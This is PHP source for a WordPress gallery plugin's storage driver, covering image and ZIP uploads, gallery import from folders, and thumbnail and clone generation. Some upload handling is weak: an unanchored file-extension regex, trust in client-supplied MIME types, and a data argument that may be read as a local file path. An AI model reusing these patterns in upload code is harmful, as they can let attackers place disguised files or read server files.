		$fs = C_Fs::get_instance();

        $retval = str_replace(
            $fs->get_document_root('gallery'),
            '',
            $this->object->get_upload_abspath($gallery)
        );

		return DIRECTORY_SEPARATOR.ltrim($retval, "/\\");
	}

	/**
	 * Moves images from to another gallery
	 * @param array $images
	 * @param int|object $gallery
	 * @param boolean $db optionally only move the image files, not the db entries
	 * @return boolean
	 */
	function move_images($images, $gallery, $db=TRUE)
	{
		return $this->object->copy_images($images, $gallery, $db, TRUE);
	}

    function is_image_file()
    {
        $retval = FALSE;

        if ((isset($_FILES['file']) && $_FILES['file']['error'] == 0)) {
            $file_info = $_FILES['file'];
            $filename  = $_FILES['file']['tmp_name'];

            if (isset($file_info['type'])) {
                $type = strtolower($file_info['type']);;
                $valid_types = array(
                    'image/gif',
                    'image/jpg',
                    'image/jpeg',
                    'image/pjpeg',
                    'image/png',
                );
                $valid_regex = '/\.(jpg|jpeg|gif|png)$/';

                // Is this a valid type?
                if (in_array($type, $valid_types)) {

                    // If we can, we'll verify the mime type
                    if (function_exists('exif_imagetype')) {
                        if (($image_type = @exif_imagetype($filename)) !== FALSE) {
                            $retval = in_array(image_type_to_mime_type($image_type), $valid_types);
                        }
                    }
                    else {
                        $file_info = @getimagesize($filename);
                        if (isset($file_info[2])) {
                            $retval = in_array(image_type_to_mime_type($file_info[2]), $valid_types);
                        }
                    }
                }

                // Is this a valid extension?
                else if (strpos($type, 'octet-stream') !== FALSE && preg_match($valid_regex, $type)) {
                    // If we can, we'll verify the mime type
                    if (function_exists('exif_imagetype')) {
                        if (($image_type = @exif_imagetype($filename)) !== FALSE) {
                            $retval = in_array(image_type_to_mime_type($image_type), $valid_types);
                        }
                    }
                    else {
                        $file_info = @getimagesize($filename);
                        if (isset($file_info[2])) {
                            $retval = in_array(image_type_to_mime_type($file_info[2]), $valid_types);
                        }
                    }
                }
            }
        }

        return $retval;
    }


    function is_zip()
    {
        $retval = FALSE;
        
        if ((isset($_FILES['file']) && $_FILES['file']['error'] == 0)) {
            $file_info = $_FILES['file'];
            
            if (isset($file_info['type'])) {
            	$type = $file_info['type'];
            	$type_parts = explode('/', $type);
            	
            	if (strtolower($type_parts[0]) == 'application') {
            		$spec = $type_parts[1];
            		$spec_parts = explode('-', $spec);
            		$spec_parts = array_map('strtolower', $spec_parts);
            		
            		if (in_array($spec, array('zip', 'octet-stream')) || in_array('zip', $spec_parts)) {
            			$retval = true;
            		}
            	}
            }
        }

        return $retval;
    }

    function upload_zip($gallery_id)
    {
        $memory_limit = intval(ini_get('memory_limit'));
        if (!extension_loaded('suhosin') && $memory_limit < 256) @ini_set('memory_limit', '256M');

        $retval = FALSE;

        if ($this->object->is_zip()) {
            $fs = $this->get_registry()->get_utility('I_Fs');

            // Uses the WordPress ZIP abstraction API
            include_once($fs->join_paths(ABSPATH, 'wp-admin', 'includes', 'file.php'));
            WP_Filesystem();
            
            // Ensure that we truly have the gallery id
            $gallery_id = $this->_get_gallery_id($gallery_id);
            
            $zipfile    = $_FILES['file']['tmp_name'];
            $dest_path = implode(DIRECTORY_SEPARATOR, array(
               rtrim(get_temp_dir(), "/\\"),
               'unpacked-'.basename($zipfile)
            ));

            wp_mkdir_p($dest_path);
            
            if ((unzip_file($zipfile, $dest_path) === TRUE)) {
            		$dest_dir = $dest_path . DIRECTORY_SEPARATOR;
                $files = glob($dest_dir . '*');
                $size = 0;
                
                foreach ($files as $file) {
                	if (is_file($dest_dir . $file)) {
                		$size += filesize($dest_dir . $file);
                	}
                }
                
                if ($size == 0) {
            			$this->object->delete_directory($dest_path);
            			
									$destination = wp_upload_dir();
									$destination_path = $destination['basedir'];
						      $dest_path = implode(DIRECTORY_SEPARATOR, array(
						         rtrim($destination_path, "/\\"),
						         'unpacked-' . basename($zipfile)
						      ));

						      wp_mkdir_p($dest_path);
						      
            			if ((unzip_file($zipfile, $dest_path) === TRUE)) {
                		$retval = $this->object->import_gallery_from_fs($dest_path, $gallery_id);
            			}
                }
                else {
                	$retval = $this->object->import_gallery_from_fs($dest_path, $gallery_id);
                }
            }
            
            $this->object->delete_directory($dest_path);
        }

        if (!extension_loaded('suhosin')) @ini_set('memory_limit', $memory_limit.'M');

        return $retval;
    }

	function is_current_user_over_quota()
	{
		$retval = FALSE;
		$settings = C_NextGen_Settings::get_instance();

		if ((is_multisite()) && $settings->get('wpmuQuotaCheck')) {
			require_once(ABSPATH . 'wp-admin/includes/ms.php');
			$retval = upload_is_user_over_quota(FALSE);
		}

		return $retval;
	}


	/**
	 * Uploads base64 file to a gallery
	 * @param int|stdClass|C_Gallery $gallery
	 * @param $data base64-encoded string of data representing the image
	 * @param type $filename specifies the name of the file
	 * @return C_Image
	 */
    function upload_base64_image($gallery, $data, $filename=FALSE, $image_id=FALSE, $override=FALSE)
	{
        $settings = C_NextGen_Settings::get_instance();
        $memory_limit = intval(ini_get('memory_limit'));
        if (!extension_loaded('suhosin') && $memory_limit < 256) @ini_set('memory_limit', '256M');

		$retval		= NULL;
		if (($gallery_id = $this->object->_get_gallery_id($gallery))) {

			if ($this->object->is_current_user_over_quota()) {
				$message = sprintf(__('Sorry, you have used your space allocation. Please delete some files to upload more files.', 'nggallery'));
				throw new E_NoSpaceAvailableException($message);
			}

			// Get path information. The use of get_upload_abspath() might
			// not be the best for some drivers. For example, if using the
			// WordPress Media Library for uploading, then the wp_upload_bits()
			// function should perhaps be used
			$upload_dir = $this->object->get_upload_abspath($gallery);

			// Perhaps a filename was given instead of base64 data?
            if (preg_match("#/\\\\#", $data[0]) && @file_exists($data)) {
				if (!$filename) $filename = basename($data);
				$data = file_get_contents($data);
			}

			// Determine filenames
			$original_filename = $filename;
			$filename = $filename ? sanitize_file_name($original_filename) : uniqid('nextgen-gallery');
			if (preg_match("/\-(png|jpg|gif|jpeg)$/i", $filename, $match)) {
				$filename = str_replace($match[0], '.'.$match[1], $filename);
			}

            $abs_filename = implode(DIRECTORY_SEPARATOR, array($upload_dir, $filename));

            // Prevent duplicate filenames: check if the filename exists and
            // begin appending '-i' until we find an open slot
            if (!ini_get('safe_mode') && @file_exists($abs_filename) && !$override)
            {
                $file_exists = TRUE;
                $i = 0;
                do {
                    $i++;
                    $parts = explode('.', $filename);
                    $extension = array_pop($parts);
                    $new_filename = implode('.', $parts) . '-' . $i . '.' . $extension;
                    $new_abs_filename = implode(DIRECTORY_SEPARATOR, array($upload_dir, $new_filename));
                    if (!@file_exists($new_abs_filename))
                    {
                        $file_exists = FALSE;
                        $filename = $new_filename;
                        $abs_filename = $new_abs_filename;
                    }
                } while ($file_exists == TRUE);
            }

			// Create or retrieve the image object
			$image	= NULL;
			if ($image_id) {
				$image	= $this->object->_image_mapper->find($image_id, TRUE);
				unset($image->meta_data['saved']);
			}
			if (!$image) $image = $this->object->_image_mapper->create();
			$retval	= $image;
			
			// Create or update the database record
			$image->alttext		= basename($original_filename, '.' . pathinfo($original_filename, PATHINFO_EXTENSION));
			$image->galleryid	= $this->object->_get_gallery_id($gallery);
			$image->filename	= $filename;
			$image->image_slug = nggdb::get_unique_slug( sanitize_title_with_dashes( $image->alttext ), 'image' );
			$image_key			= $this->object->_image_mapper->get_primary_key_column();

            // If we can't write to the directory, then there's no point in continuing
            if (!@file_exists($upload_dir)) @wp_mkdir_p($upload_dir);
            if (!is_writable($upload_dir)) {
                throw new E_InsufficientWriteAccessException(
                    FALSE, $upload_dir, FALSE
                );
            }

			// Save the image
			if (($image_id = $this->object->_image_mapper->save($image))) {
				try {
					// Try writing the image
					$fp = fopen($abs_filename, 'w');
					fwrite($fp, $data);
					fclose($fp);

                    if ($settings->imgBackup)
                        $this->object->backup_image($image);

                    if ($settings->imgAutoResize)
                        $this->object->generate_image_clone(
                            $abs_filename,
                            $abs_filename,
                            $this->object->get_image_size_params($image_id, 'full')
                        );

                    // Ensure that fullsize dimensions are added to metadata array
                    $dimensions = getimagesize($abs_filename);
                    $full_meta = array(
                        'width'		=>	$dimensions[0],
                        'height'	=>	$dimensions[1]
                    );
                    if (!isset($image->meta_data) OR (is_string($image->meta_data) && strlen($image->meta_data) == 0)) {
                        $image->meta_data = array();
                    }
                    $image->meta_data = array_merge($image->meta_data, $full_meta);
                    $image->meta_data['full'] = $full_meta;

					// Generate a thumbnail for the image
					$this->object->generate_thumbnail($image);

                    // Set gallery preview image if missing
                    $this->object->get_registry()->get_utility('I_Gallery_Mapper')->set_preview_image($gallery, $image_id, TRUE);

					// Notify other plugins that an image has been added
					do_action('ngg_added_new_image', $image);

					// delete dirsize after adding new images
					delete_transient( 'dirsize_cache' );

					// Seems redundant to above hook. Maintaining for legacy purposes
					do_action(
						'ngg_after_new_images_added',
						$gallery_id,
						array($image->$image_key)
					);
				}
				catch(E_No_Image_Library_Exception $ex) {
						throw $ex;
				}
				catch(E_Clean_Exit $ex) {
					// pass
				}
				catch(Exception $ex) {
					throw new E_InsufficientWriteAccessException(
						FALSE, $abs_filename, FALSE, $ex
					);
				}
			}
            else throw new E_InvalidEntityException();
		}
		else throw new E_EntityNotFoundException();

        if (!extension_loaded('suhosin')) @ini_set('memory_limit', $memory_limit.'M');

		return $retval;
	}

    function import_gallery_from_fs($abspath, $gallery_id=FALSE, $move_files=TRUE)
    {
        $retval = FALSE;
        if (@file_exists($abspath)) {

            // Ensure that this folder has images
            $files_all = scandir($abspath);
            $files = array();
            
            // first perform some filtering on file list
            foreach ($files_all as $file)
            {
            	if ($file == '.' || $file == '..')
            		continue;
            		
            	$files[] = $file;
            }
            
            if (!empty($files)) {

                // Get needed utilities
                $fs = $this->get_registry()->get_utility('I_Fs');
                $gallery_mapper = $this->get_registry()->get_utility('I_Gallery_Mapper');

                // Sometimes users try importing a directory, which actually has all images under another directory
                $first_file_abspath = $fs->join_paths($abspath, $files[0]);
                if (is_dir($first_file_abspath) && count($files) == 1) return $this->import_gallery_from_fs($first_file_abspath, $gallery_id, $move_files);

                // If no gallery has been specified, then use the directory name as the gallery name
                if (!$gallery_id) {
                    // Create the gallery
                    $gallery = $gallery_mapper->create(array(
                        'title'         =>  basename($abspath),
                    ));
                    
                    if (!$move_files) {
                    	$gallery->path = str_ireplace(ABSPATH, '', $abspath);
                    }

                    // Save the gallery
                    if ($gallery->save()) $gallery_id = $gallery->id();
                }

                // Ensure that we have a gallery id
                if ($gallery_id) {
                    $retval = array('gallery_id' => $gallery_id, 'image_ids' => array());
                    foreach ($files as $file) {
                        if (!preg_match("/\.(jpg|jpeg|gif|png)/i", $file)) continue;
                        $file_abspath = $fs->join_paths($abspath, $file);
                        $image = null;
                        
                        if ($move_files) {
		                      $image = $this->object->upload_base64_image(
		                          $gallery_id,
		                          file_get_contents($file_abspath),
		                          str_replace(' ', '_', $file)
		                      );
                        }
                        else {
													// Create the database record ... TODO cleanup, some duplication here from upload_base64_image
													$factory = $this->object->get_registry()->get_utility('I_Component_Factory');
													$image = $factory->create('image');
													$image->alttext		= sanitize_title_with_dashes(basename($file_abspath, '.' . pathinfo($file_abspath, PATHINFO_EXTENSION)));
													$image->galleryid	= $this->object->_get_gallery_id($gallery_id);
													$image->filename	= basename($file_abspath);
													$image->image_slug = nggdb::get_unique_slug( sanitize_title_with_dashes( $image->alttext ), 'image' );
													$image_key			= $this->object->_image_mapper->get_primary_key_column();
													$abs_filename = $file_abspath;

													if (($image_id = $this->object->_image_mapper->save($image))) {
														try {
															// backup and image resizing should have already been performed, better to avoid
#															if ($settings->imgBackup)
#															    $this->object->backup_image($image);

#															if ($settings->imgAutoResize)
#															    $this->object->generate_image_clone(
#															        $abs_filename,
#															        $abs_filename,
#															        $this->object->get_image_size_params($image_id, 'full')
#															    );

															// Ensure that fullsize dimensions are added to metadata array
															$dimensions = getimagesize($abs_filename);
															$full_meta = array(
															    'width'		=>	$dimensions[0],
															    'height'	=>	$dimensions[1]
															);
															if (!isset($image->meta_data) OR (is_string($image->meta_data) && strlen($image->meta_data) == 0)) {
															    $image->meta_data = array();
															}
															$image->meta_data = array_merge($image->meta_data, $full_meta);
															$image->meta_data['full'] = $full_meta;

															// Generate a thumbnail for the image
															$this->object->generate_thumbnail($image);

															// Set gallery preview image if missing
															$this->object->get_registry()->get_utility('I_Gallery_Mapper')->set_preview_image($gallery, $image_id, TRUE);

															// Notify other plugins that an image has been added
															do_action('ngg_added_new_image', $image);

															// delete dirsize after adding new images
															delete_transient( 'dirsize_cache' );

															// Seems redundant to above hook. Maintaining for legacy purposes
															do_action(
																'ngg_after_new_images_added',
																$gallery_id,
																array($image->$image_key)
															);
														}
														catch(Exception $ex) {
															throw new E_InsufficientWriteAccessException(
																FALSE, $abs_filename, FALSE, $ex
															);
														}
													}
													else throw new E_InvalidEntityException();
                    	}
				                    	
                      $retval['image_ids'][] = $image->{$image->id_field};
                    }

                    // Add the gallery name to the result
                    $gallery = $gallery_mapper->find($gallery_id);
                    $retval['gallery_name'] = $gallery->title;
                    unset($gallery);
                }
            }
        }

        return $retval;
    }

	function get_image_format_list()
	{
		$format_list = array(IMAGETYPE_GIF => 'gif', IMAGETYPE_JPEG => 'jpg', IMAGETYPE_PNG => 'png');

		return $format_list;
	}

	/**
	 * Returns an array of properties of a resulting clone image if and when generated
	 * @param string $image_path
	 * @param string $clone_path
	 * @param array $params
	 * @return array
	 */
	function calculate_image_clone_result($image_path, $clone_path, $params)
	{
		$width      = isset($params['width'])      ? $params['width']      : NULL;
		$height     = isset($params['height'])     ? $params['height']     : NULL;
		$quality    = isset($params['quality'])    ? $params['quality']    : NULL;
		$type       = isset($params['type'])       ? $params['type']       : NULL;
		$crop       = isset($params['crop'])       ? $params['crop']       : NULL;
		$watermark  = isset($params['watermark'])  ? $params['watermark']  : NULL;
		$rotation   = isset($params['rotation'])   ? $params['rotation']   : NULL;
		$reflection = isset($params['reflection']) ? $params['reflection'] : NULL;
		$crop_frame = isset($params['crop_frame']) ? $params['crop_frame'] : NULL;
		$result  = NULL;

		// Ensure we have a valid image
		if ($image_path && @file_exists($image_path))
		{
			// Ensure target directory exists, but only create 1 subdirectory
			$image_dir = dirname($image_path);
			$clone_dir = dirname($clone_path);
			$image_extension = pathinfo($image_path, PATHINFO_EXTENSION);
			$image_extension_str = null;
			$clone_extension = pathinfo($clone_path, PATHINFO_EXTENSION);
			$clone_extension_str = null;

			if ($image_extension != null)
			{
				$image_extension_str = '.' . $image_extension;
			}

			if ($clone_extension != null)
			{
				$clone_extension_str = '.' . $clone_extension;
			}

			$image_basename = basename($image_path, $image_extension_str);
			$clone_basename = basename($clone_path, $clone_extension_str);
			// We use a default suffix as passing in null as the suffix will make WordPress use a default
			$clone_suffix = null;
			$format_list = $this->object->get_image_format_list();
			$clone_format = null; // format is determined below and based on $type otherwise left to null

			// suffix is only used to reconstruct paths for image_resize function
			if (strpos($clone_basename, $image_basename) === 0)
			{
				$clone_suffix = substr($clone_basename, strlen($image_basename));
			}

			if ($clone_suffix != null && $clone_suffix[0] == '-')
			{
				// WordPress adds '-' on its own
				$clone_suffix = substr($clone_suffix, 1);
			}

            // Get original image dimensions
			$dimensions = getimagesize($image_path);

			if ($width == null && $height == null) {
				if ($dimensions != null) {

					if ($width == null) {
						$width = $dimensions[0];
					}

					if ($height == null) {
						$height = $dimensions[1];
					}
				}
				else {
					// XXX Don't think there's any other option here but to fail miserably...use some hard-coded defaults maybe?
					return null;
				}
			}

			if ($dimensions != null) {
				$dimensions_ratio = $dimensions[0] / $dimensions[1];

				if ($width == null) {
					$width = (int) round($height * $dimensions_ratio);

					if ($width == ($dimensions[0] - 1))
					{
						$width = $dimensions[0];
					}
				}
				else if ($height == null) {
					$height = (int) round($width / $dimensions_ratio);

					if ($height == ($dimensions[1] - 1))
					{
						$height = $dimensions[1];
					}
				}

				if ($width > $dimensions[0]) {
					$width = $dimensions[0];
				}

				if ($height > $dimensions[1]) {
					$height = $dimensions[1];
				}

				$image_format = $dimensions[2];

				if ($type != null)
				{
					if (is_string($type))
					{
						$type = strtolower($type);

						// Indexes in the $format_list array correspond to IMAGETYPE_XXX values appropriately
						if (($index = array_search($type, $format_list)) !== false)
						{
							$type = $index;

							if ($type != $image_format)
							{
								// Note: this only changes the FORMAT of the image but not the extension
								$clone_format = $type;
							}
						}
					}
				}
			}

			if ($width == null || $height == null) {
				// Something went wrong...
				return null;
			}

			$result['clone_path'] = $clone_path;
			$result['clone_directory'] = $clone_dir;
			$result['clone_suffix'] = $clone_suffix;
			$result['clone_format'] = $clone_format;
			$result['base_width'] = $dimensions[0];
			$result['base_height'] = $dimensions[1];

			// image_resize() has limitations:
			// - no easy crop frame support
			// - fails if the dimensions are unchanged
			// - doesn't support filename prefix, only suffix so names like thumbs_original_name.jpg for $clone_path are not supported
			//   also suffix cannot be null as that will make WordPress use a default suffix...we could use an object that returns empty string from __toString() but for now just fallback to ngg generator
            if (FALSE) { // disabling the WordPress method for Iteration #6
//			if (($crop_frame == null || !$crop) && ($dimensions[0] != $width && $dimensions[1] != $height) && $clone_suffix != null)
				$result['method'] = 'wordpress';

				$new_dims = image_resize_dimensions($dimensions[0], $dimensions[1], $width, $height, $crop);

				if ($new_dims) {
					list($dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h) = $new_dims;

					$width = $dst_w;
					$height = $dst_h;
				}
				else {
					$result['error'] = new WP_Error( 'error_getting_dimensions', __('Could not calculate resized image dimensions') );
				}
			}
			else
			{
				$result['method'] = 'nextgen';
				$original_width = $dimensions[0];
				$original_height = $dimensions[1];
				$original_ratio = $original_width / $original_height;

				$aspect_ratio = $width / $height;

				$orig_ratio_x = $original_width / $width;
				$orig_ratio_y = $original_height / $height;

				if ($crop)
				{
					$algo = 'shrink'; // either 'adapt' or 'shrink'

					if ($crop_frame != null)
					{
						$crop_x = (int) round($crop_frame['x']);
						$crop_y = (int) round($crop_frame['y']);
						$crop_width = (int) round($crop_frame['width']);
						$crop_height = (int) round($crop_frame['height']);
						$crop_final_width = (int) round($crop_frame['final_width']);
						$crop_final_height = (int) round($crop_frame['final_height']);

						$crop_width_orig = $crop_width;
						$crop_height_orig = $crop_height;

						$crop_factor_x = $crop_width / $crop_final_width;
						$crop_factor_y = $crop_height / $crop_final_height;

						$crop_ratio_x = $crop_width / $width;
						$crop_ratio_y = $crop_height / $height;

						if ($algo == 'adapt')
						{
							// XXX not sure about this...don't use for now
#							$crop_width = (int) round($width * $crop_factor_x);
#							$crop_height = (int) round($height * $crop_factor_y);
						}
						else if ($algo == 'shrink')
						{
							if ($crop_ratio_x < $crop_ratio_y)
							{
								$crop_width = max($crop_width, $width);
								$crop_height = (int) round($crop_width / $aspect_ratio);
							}
							else
							{
								$crop_height = max($crop_height, $height);
								$crop_width = (int) round($crop_height * $aspect_ratio);
							}

							if ($crop_width == ($crop_width_orig - 1))
							{
								$crop_width = $crop_width_orig;
							}

							if ($crop_height == ($crop_height_orig - 1))
							{
								$crop_height = $crop_height_orig;
							}
						}

						$crop_diff_x = (int) round(($crop_width_orig - $crop_width) / 2);
						$crop_diff_y = (int) round(($crop_height_orig - $crop_height) / 2);

						$crop_x += $crop_diff_x;
						$crop_y += $crop_diff_y;

						$crop_max_x = ($crop_x + $crop_width);
						$crop_max_y = ($crop_y + $crop_height);

						// Check if we're overflowing borders
						//
						if ($crop_x < 0)
						{
							$crop_x = 0;
						}
						else if ($crop_max_x > $original_width)
						{
							$crop_x -= ($crop_max_x - $original_width);
						}

						if ($crop_y < 0)
						{
							$crop_y = 0;
						}
						else if ($crop_max_y > $original_height)
						{
							$crop_y -= ($crop_max_y - $original_height);
						}
					}
					else
					{
						if ($orig_ratio_x < $orig_ratio_y)
						{
							$crop_width = $original_width;
							$crop_height = (int) round($height * $orig_ratio_x);

						}
						else
						{
							$crop_height = $original_height;
							$crop_width = (int) round($width * $orig_ratio_y);
						}

						if ($crop_width == ($width - 1))
						{
							$crop_width = $width;
						}

						if ($crop_height == ($height - 1))
						{
							$crop_height = $height;
						}

						$crop_x = (int) round(($original_width - $crop_width) / 2);
						$crop_y = (int) round(($original_height - $crop_height) / 2);
					}

					$result['crop_area'] = array('x' => $crop_x, 'y' => $crop_y, 'width' => $crop_width, 'height' => $crop_height);
				}
				else {
					// Just constraint dimensions to ensure there's no stretching or deformations
					list($width, $height) = wp_constrain_dimensions($original_width, $original_height, $width, $height);
				}
			}

			$result['width'] = $width;
			$result['height'] = $height;
			$result['quality'] = $quality;

			$real_width = $width;
			$real_height = $height;

			if ($rotation && in_array(abs($rotation), array(90, 270)))
			{
				$real_width = $height;
				$real_height = $width;
			}

			if ($reflection)
			{
				// default for nextgen was 40%, this is used in generate_image_clone as well
				$reflection_amount = 40;
				// Note, round() would probably be best here but using the same code that C_NggLegacy_Thumbnail uses for compatibility
        $reflection_height = intval($real_height * ($reflection_amount / 100));
        $real_height = $real_height + $reflection_height;
			}

			$result['real_width'] = $real_width;
			$result['real_height'] = $real_height;
		}

		return $result;
	}

	/**
	 * Returns an array of dimensional properties (width, height, real_width, real_height) of a resulting clone image if and when generated
	 * @param string $image_path
	 * @param string $clone_path
	 * @param array $params
	 * @return array
	 */
	function calculate_image_clone_dimensions($image_path, $clone_path, $params)
	{
		$retval = null;
		$result = $this->object->calculate_image_clone_result($image_path, $clone_path, $params);

		if ($result != null) {
			$retval = array(
				'width' => $result['width'],
				'height' => $result['height'],
				'real_width' => $result['real_width'],
				'real_height' => $result['real_height']
			);
		}

		return $retval;
	}

	/**
	 * Generates a "clone" for an existing image, the clone can be altered using the $params array
	 * @param string $image_path
	 * @param string $clone_path
	 * @param array $params
	 * @return object
	 */
	function generate_image_clone($image_path, $clone_path, $params)
	{
		$width      = isset($params['width'])      ? $params['width']      : NULL;
		$height     = isset($params['height'])     ? $params['height']     : NULL;
		$quality    = isset($params['quality'])    ? $params['quality']    : NULL;
		$type       = isset($params['type'])       ? $params['type']       : NULL;
		$crop       = isset($params['crop'])       ? $params['crop']       : NULL;
		$watermark  = isset($params['watermark'])  ? $params['watermark']  : NULL;
		$reflection = isset($params['reflection']) ? $params['reflection'] : NULL;
		$rotation   = isset($params['rotation']) ? $params['rotation'] : NULL;
		$flip   = isset($params['flip']) ? $params['flip'] : NULL;
		$crop_frame = isset($params['crop_frame']) ? $params['crop_frame'] : NULL;
		$destpath   = NULL;
		$thumbnail  = NULL;
		$quality	= 100;

        // Do this before anything else can modify the original -- $detailed_size
        // may hold IPTC metadata we need to write to our clone
        $size = getimagesize($image_path, $detailed_size);

		$result = $this->object->calculate_image_clone_result($image_path, $clone_path, $params);

		// XXX this should maybe be removed and extra settings go into $params?
		$settings = C_NextGen_Settings::get_instance();

		// Ensure we have a valid image
		if ($image_path && @file_exists($image_path) && $result != null && !isset($result['error']))
		{
			$image_dir = dirname($image_path);
			$clone_path = $result['clone_path'];
			$clone_dir = $result['clone_directory'];
			$clone_suffix = $result['clone_suffix'];
			$clone_format = $result['clone_format'];
			$format_list = $this->object->get_image_format_list();

			// Ensure target directory exists, but only create 1 subdirectory
			if (!@file_exists($clone_dir))
			{
				if (strtolower(realpath($image_dir)) != strtolower(realpath($clone_dir)))
				{
					if (strtolower(realpath($image_dir)) == strtolower(realpath(dirname($clone_dir))))
					{
						wp_mkdir_p($clone_dir);
					}
				}
			}

			$method = $result['method'];
			$width = $result['width'];
			$height = $result['height'];
			$quality = $result['quality'];
			
			if ($quality == null)
			{
				$quality = 100;
			}

			if ($method == 'wordpress')
			{
                $original = wp_get_image_editor($image_path);
                $destpath = $clone_path;
                if (!is_wp_error($original))
                {
                    $original->resize($width, $height, $crop);
                    $original->set_quality($quality);
                    $original->save($clone_path);
                }
			}
			else if ($method == 'nextgen')
			{
				$destpath = $clone_path;
				$thumbnail = new C_NggLegacy_Thumbnail($image_path, true);
                if (!$thumbnail->error) {
                    if ($crop) {
                        $crop_area = $result['crop_area'];
                        $crop_x = $crop_area['x'];
                        $crop_y = $crop_area['y'];
                        $crop_width = $crop_area['width'];
                        $crop_height = $crop_area['height'];

                        $thumbnail->crop($crop_x, $crop_y, $crop_width, $crop_height);
                    }

                    $thumbnail->resize($width, $height);
                }
                else $thumbnail = NULL;
			}

			// We successfully generated the thumbnail
			if (is_string($destpath) && (@file_exists($destpath) || $thumbnail != null))
			{
				if ($clone_format != null)
				{
					if (isset($format_list[$clone_format]))
					{
						$clone_format_extension = $format_list[$clone_format];
						$clone_format_extension_str = null;

						if ($clone_format_extension != null)
						{
							$clone_format_extension_str = '.' . $clone_format_extension;
						}

						$destpath_info = pathinfo($destpath);
						$destpath_extension = $destpath_info['extension'];
						$destpath_extension_str = null;

						if ($destpath_extension != null)
						{
							$destpath_extension_str = '.' . $destpath_extension;
						}

						if (strtolower($destpath_extension) != strtolower($clone_format_extension))
						{
							$destpath_dir = $destpath_info['dirname'];
							$destpath_basename = $destpath_info['filename'];
							$destpath_new = $destpath_dir . DIRECTORY_SEPARATOR . $destpath_basename . $clone_format_extension_str;

							if ((@file_exists($destpath) && rename($destpath, $destpath_new)) || $thumbnail != null)
							{
								$destpath = $destpath_new;
							}
						}
					}
				}

				if (is_null($thumbnail))
				{
					$thumbnail = new C_NggLegacy_Thumbnail($destpath, true);
				}
				else
				{
					$thumbnail->fileName = $destpath;
				}

				// This is quite odd, when watermark equals int(0) it seems all statements below ($watermark == 'image') and ($watermark == 'text') both evaluate as true
				// so we set it at null if it evaluates to any null-like value
				if ($watermark == null)
				{
					$watermark = null;
				}
				
				if ($watermark == 1 || $watermark === true)
				{
					if (in_array(strval($settings->wmType), array('image', 'text')))
					{
						$watermark = $settings->wmType;
					}
					else
					{
						$watermark = 'text';
					}
				}
				
				$watermark = strval($watermark);

				if ($watermark == 'image')
				{
					$thumbnail->watermarkImgPath = $settings['wmPath'];
					$thumbnail->watermarkImage($settings['wmPos'], $settings['wmXpos'], $settings['wmYpos']);
				}
				else if ($watermark == 'text')
				{
					$thumbnail->watermarkText = $settings['wmText'];
					$thumbnail->watermarkCreateText($settings['wmColor'], $settings['wmFont'], $settings['wmSize'], $settings['wmOpaque']);
					$thumbnail->watermarkImage($settings['wmPos'], $settings['wmXpos'], $settings['wmYpos']);
				}

				if ($rotation && in_array(abs($rotation), array(90, 180, 270)))
				{
					$thumbnail->rotateImageAngle($rotation);
				}

				$flip = strtolower($flip);

				if ($flip && in_array($flip, array('h', 'v', 'hv')))
				{
					$flip_h = in_array($flip, array('h', 'hv'));
					$flip_v = in_array($flip, array('v', 'hv'));

					$thumbnail->flipImage($flip_h, $flip_v);
				}

				if ($reflection)
				{
					$thumbnail->createReflection(40, 40, 50, FALSE, '#a4a4a4');
				}

				if ($clone_format != null && isset($format_list[$clone_format]))
				{
					// Force format
					$thumbnail->format = strtoupper($format_list[$clone_format]);
				}

				$thumbnail->save($destpath, $quality);

                // IF the original contained IPTC metadata we should attempt to copy it
                if (isset($detailed_size['APP13']) && function_exists('iptcembed'))
                {
                    $metadata = @iptcembed($detailed_size['APP13'], $destpath);
                    $fp = @fopen($destpath, 'wb');
                    @fwrite($fp, $metadata);
                    @fclose($fp);
                }
			}
		}

		return $thumbnail;
	}
}

class C_GalleryStorage_Driver_Base extends C_GalleryStorage_Base
{
    public static $_instances = array();

	function define($context)
	{
		parent::define($context);
		$this->add_mixin('Mixin_GalleryStorage_Driver_Base');
		$this->implement('I_GalleryStorage_Driver');
	}

	function initialize()
	{
		parent::initialize();
		$this->_gallery_mapper = $this->get_registry()->get_utility('I_Gallery_Mapper');
		$this->_image_mapper = $this->get_registry()->get_utility('I_Image_Mapper');
	}

    public static function get_instance($context = False)
    {
        if (!isset(self::$_instances[$context]))
        {
            self::$_instances[$context] = new C_GalleryStorage_Driver_Base($context);
        }
        return self::$_instances[$context];
    }


	/**
	 * Gets the class name of the driver used
	 * @return string
	 */
	function get_driver_class_name()
	{
		return get_called_class();
	}
}
